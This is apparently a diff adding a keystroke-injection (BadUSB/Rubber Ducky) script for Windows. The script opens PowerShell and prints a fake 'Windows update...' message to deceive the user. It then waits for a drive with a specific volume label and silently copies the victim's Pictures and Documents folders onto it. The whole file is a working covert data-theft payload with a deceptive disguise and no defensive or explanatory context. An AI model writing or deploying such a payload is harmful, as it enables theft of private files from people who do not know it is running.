@@ -1,0 +1,10 @@
+LOCALE US
+DELAY 600
+GUI r
+DELAY 100
+STRING powershell
+ENTER
+DELAY 1000
+STRING $d = @(@("pictures", "c:\users\$env:username\pictures"),@("documents", "c:\users\$env:username\documents"));$n = "34BH88FRL9";cls;write-host "Windows update...";while($true) {$l = (get-psdrive -psprovider filesystem | where-object description -eq $n).name;if($l -match '[A-Z]') {break};sleep(1)};foreach($i in $d) {$p = $i[1];$dn = $i[0];if(test-path $p) {xcopy $p $l":\"$env:computername"\"$dn"\" /c /e /h /y /q;cls}};exit
+DELAY 100
+ENTER
